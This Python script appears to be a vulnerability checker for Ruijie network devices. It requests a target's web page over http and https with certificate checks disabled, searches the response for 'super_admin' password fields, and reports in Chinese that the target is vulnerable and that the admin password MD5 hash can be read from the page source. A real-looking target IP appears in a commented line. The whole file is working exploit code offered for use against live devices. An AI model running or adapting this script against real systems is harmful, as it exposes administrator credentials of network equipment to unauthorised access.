#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re


def run_proto(url, target):
    Vuln_url = '{}'.format(url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Host": "{}".format(target)
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        res = requests.get(url=Vuln_url, headers=headers, verify=False, timeout=3)
        pattern = re.search(r'super_admin.*?password.*?lastpwdtime', res.text, re.I | re.M)
        devname = re.search(r'ruijie', res.text, re.I | re.M)
        if pattern and res.status_code == 200 and devname:
            print("目标{}存在漏洞 ,F12查看源码获取密码md5值".format(url))
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port, target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url, target):
            return True
        else:
            i += 1
    return False
if __name__ == '__main__':
    #target = '183.224.192.40:4000'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port, target)

    if result:
        print('Exist')
    else:
        print('UnExist')

